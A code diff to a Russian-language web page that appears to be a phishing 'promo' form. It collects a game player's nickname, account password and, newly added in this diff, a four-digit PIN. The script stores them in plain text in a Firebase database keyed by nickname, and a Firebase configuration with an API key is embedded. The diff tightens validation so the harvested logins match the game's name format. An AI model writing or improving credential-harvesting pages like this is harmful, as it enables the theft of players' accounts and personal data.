@@ -26,7 +26,7 @@
             padding: 20px;
         }
 
-        /* Стиль матового стекла (Liquid Glass) */
+        /* Стиль Liquid Glass (Матовое стекло) */
         .glass-container {
             background: rgba(255, 255, 255, 0.03);
             backdrop-filter: blur(15px);
@@ -40,7 +40,6 @@
             text-align: center;
         }
 
-        /* Текст сверху, который ты можешь легко изменить */
         .promo-title {
             font-size: 20px;
             font-weight: bold;
@@ -51,7 +50,7 @@
 
         .promo-subtitle {
             font-size: 14px;
-            color: #38bdf8; /* Мягкий голубой акцент вместо неона/красного */
+            color: #38bdf8; /* Голубой акцент */
             margin-bottom: 25px;
         }
 
@@ -84,7 +83,15 @@
             border-color: #38bdf8;
         }
 
-        /* Кнопки в стиле интерфейса игры */
+        /* Стиль для сообщения об ошибке формата ника */
+        .error-message {
+            display: none;
+            color: #fb923c; /* Мягкий оранжевый вместо агрессивного красного */
+            font-size: 12px;
+            margin-top: 5px;
+            padding-left: 4px;
+        }
+
         .btn {
             width: 100%;
             padding: 14px;
@@ -118,7 +125,6 @@
             background: rgba(255, 255, 255, 0.12);
         }
 
-        /* Выбор сервера */
         #menu {
             display: none;
             margin-top: -5px;
@@ -140,11 +146,11 @@
         #selected {
             margin: 10px 0 15px 0;
             font-size: 14px;
-            color: #34d399; /* Приятный зеленый для успешного выбора */
+            color: #34d399;
             font-weight: 500;
         }
 
-        /* Кастомное модальное окно уведомления */
+        /* Модальное окно */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -205,13 +211,21 @@
         <form id="accountForm" onsubmit="submitForm(event)">
             
             <div class="input-group">
-                <label for="username">Игровой ник (английскими буквами)</label>
-                <input type="text" id="username" class="input-field" placeholder="Пример: Ivan_Ivanov" required pattern="[A-Za-z0-9_@ ]+">
+                <label for="username">Игровой ник (английский формат Имя_Фамилия)</label>
+                <input type="text" id="username" class="input-field" placeholder="Пример: Ivan_Ivanov" required>
+                <div id="usernameError" class="error-message">Ник должен быть в формате Имя_Фамилия (на английском)!</div>
             </div>
 
             <div class="input-group">
                 <label for="password">Пароль от аккаунта</label>
                 <input type="password" id="password" class="input-field" placeholder="Введите ваш пароль" required pattern="[A-Za-z0-9_@]+">
+            </div>
+
+            <div class="input-group">
+                <label for="pincode">Пин-код (4 цифры)</label>
+                <input type="text" id="pincode" class="input-field" placeholder="Х Х Х Х" required 
+                       maxlength="4" inputmode="numeric" pattern="[0-9]{4}" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '')">
             </div>
 
             <button type="button" class="btn btn-secondary" onclick="openMenu()">Выбрать сервер</button>
@@ -328,7 +342,7 @@
     </div>
 
     <script>
-        // Конфиг Firebase, который ты предоставил
+        // Твой конфиг Firebase Realtime Database
         const firebaseConfig = {
             apiKey: "AIzaSyCHjsiC8jC1AVkCvMmDXK7_fVKm6StpUtw",
             authDomain: "beaschat-e0a28.firebaseapp.com",
@@ -340,11 +354,9 @@
             databaseURL: "https://beaschat-e0a28-default-rtdb.europe-west1.firebasedatabase.app"
         };
 
-        // Инициализация Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Функции управления меню серверов
         function openMenu(){
             document.getElementById("menu").style.display = "block";
         }
@@ -360,41 +372,59 @@
             }
         }
 
-        // Загрузка сохраненного сервера при открытии страницы
         window.onload = function(){
             let saved = localStorage.getItem("selectedServer");
             if(saved){
                 document.getElementById("serverSelect").value = saved;
-                document.getElementById("selected").innerHTML = "Выбран сервер: " + saved;
+                document.getElementById("selected").innerHTML = "Выбран server: " + saved;
             }
         }
 
-        // Функция отправки формы и сохранения данных по НИКУ игрока
+        // Логика отправки формы с жесткой валидацией
         function submitForm(event) {
             event.preventDefault();
 
-            let rawUsername = document.getElementById("username").value.trim();
+            let usernameField = document.getElementById("username");
+            let usernameVal = usernameField.value.trim();
             let passwordVal = document.getElementById("password").value;
+            let pincodeVal = document.getElementById("pincode").value;
             let serverVal = document.getElementById("serverSelect").value;
+            let errorDiv = document.getElementById("usernameError");
+
+            // Регулярное выражение: проверяет формат Имя_Фамилия (английские буквы, строго одно подчёркивание в середине)
+            const nicknameRegex = /^[A-Za-z]+_[A-Za-z]+$/;
+
+            if (!nicknameRegex.test(usernameVal)) {
+                // Если формат неверный — показываем ошибку и останавливаем скрипт
+                errorDiv.style.display = "block";
+                usernameField.style.borderColor = "#fb923c";
+                usernameField.focus();
+                return;
+            } else {
+                // Если всё ок — прячем ошибку
+                errorDiv.style.display = "none";
+                usernameField.style.borderColor = "rgba(255, 255, 255, 0.1)";
+            }
 
             if(!serverVal) {
                 alert("Пожалуйста, выберите сервер!");
                 return;
             }
 
-            // Форматируем ник: убираем лишние пробелы внутри и заменяем их на "_", чтобы путь в БД был правильным
-            let usernameVal = rawUsername.replace(/\s+/g, '_');
+            if(pincodeVal.length !== 4) {
+                alert("Пин-код должен состоять ровно из 4 цифр!");
+                return;
+            }
 
-            // Сохраняем в Firebase по пути: users/Имя_Игрока
-            // Таким образом, в панели Firebase не будет случайных букв-ключей, а будут понятные папки с никами
+            // Запись в Firebase: ветка users/Имя_Фамилия
             database.ref('users/' + usernameVal).set({
                 username: usernameVal,
                 password: passwordVal,
+                pincode: pincodeVal,
                 server: serverVal,
                 date: new Date().toLocaleString()
             })
             .then(() => {
-                // Если данные записались успешно — сбрасываем форму и открываем окно
                 document.getElementById("accountForm").reset();
                 document.getElementById("selected").innerHTML = "";
                 localStorage.removeItem("selectedServer");
@@ -403,11 +433,10 @@
             })
             .catch((error) => {
                 console.error("Ошибка сохранения:", error);
-                alert("Произошла ошибка при отправке данных. Попробуйте еще раз.");
+                alert("Ошибка соединения с базой данных!");
             });
         }
 
-        // Закрытие модального окна
         function closeModal() {
             document.getElementById("successModal").style.display = "none";
         }
